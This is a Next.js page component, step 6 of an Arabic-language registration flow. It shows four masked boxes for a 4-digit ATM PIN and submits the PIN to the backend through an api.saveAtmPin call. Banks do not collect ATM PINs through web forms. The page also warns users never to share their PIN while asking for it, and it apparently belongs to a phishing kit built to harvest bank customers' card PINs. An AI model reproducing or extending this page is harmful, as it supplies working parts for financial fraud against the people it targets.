'use client';

import { useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Layout from '@/components/Layout';
import ProgressBar from '@/components/ProgressBar';
import { api } from '@/lib/api';

export default function Step6Page() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [pin, setPin] = useState(['', '', '', '']);
  const pinRefs = Array(4).fill(0).map(() => useRef<HTMLInputElement>(null));

  const handlePinChange = (index: number, value: string) => {
    if (value.length > 1) return;
    if (!/^\d*$/.test(value)) return; // Only numbers
    
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    // Auto-focus next input
    if (value && index < 3) {
      pinRefs[index + 1].current?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs[index - 1].current?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const atmPin = pin.join('');
    
    if (atmPin.length !== 4) {
      alert('يرجى إدخال رقم PIN كاملاً');
      return;
    }

    setLoading(true);

    try {
      await api.saveAtmPin(atmPin);
      // Redirect to success page
      router.push('/success');
    } catch (error) {
      console.error('Error saving ATM PIN:', error);
      alert('حدث خطأ. يرجى المحاولة مرة أخرى.');
      setLoading(false);
    }
  };

  return (
    <Layout title="الخطوة السادسة - رقم التعريف الشخصي (PIN)">
      <ProgressBar currentStep={6} />

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="bg-yellow-50 border-r-4 border-yellow-400 p-4 rounded mb-6">
          <div className="flex">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="mr-3">
              <h3 className="text-sm font-medium text-yellow-800">
                تنبيه أمني
              </h3>
              <div className="mt-2 text-sm text-yellow-700">
                <p>
                  رقم PIN الخاص بك سري للغاية. لا تشاركه مع أي شخص.
                </p>
              </div>
            </div>
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-4 text-center">
            أدخل رقم PIN المكون من 4 أرقام
          </label>
          <div className="flex justify-center gap-3" dir="ltr">
            {pin.map((digit, index) => (
              <input
                key={index}
                ref={pinRefs[index]}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handlePinChange(index, e.target.value)}
                onKeyDown={(e) => handlePinKeyDown(index, e)}
                className="w-16 h-20 text-center text-3xl font-bold border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
                disabled={loading}
              />
            ))}
          </div>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
          <h4 className="font-medium text-gray-800 mb-2">متطلبات رقم PIN:</h4>
          <ul className="list-disc list-inside space-y-1 text-sm text-gray-600 mr-4">
            <li>يجب أن يكون مكوناً من 4 أرقام</li>
            <li>لا تستخدم أرقاماً متسلسلة (مثل 1234)</li>
            <li>لا تستخدم أرقاماً متكررة (مثل 1111)</li>
            <li>اختر رقماً يسهل عليك تذكره ولكن يصعب تخمينه</li>
          </ul>
        </div>

        <div className="flex gap-4 pt-6">
          <button
            type="submit"
            disabled={loading || pin.join('').length !== 4}
            className="flex-1 bg-[#0876b1] hover:bg-[#065681] text-white font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? 'جاري الحفظ...' : 'إنهاء التسجيل'}
          </button>
          <button
            type="button"
            onClick={() => router.back()}
            disabled={loading}
            className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50"
          >
            → السابق
          </button>
        </div>
      </form>
    </Layout>
  );
}
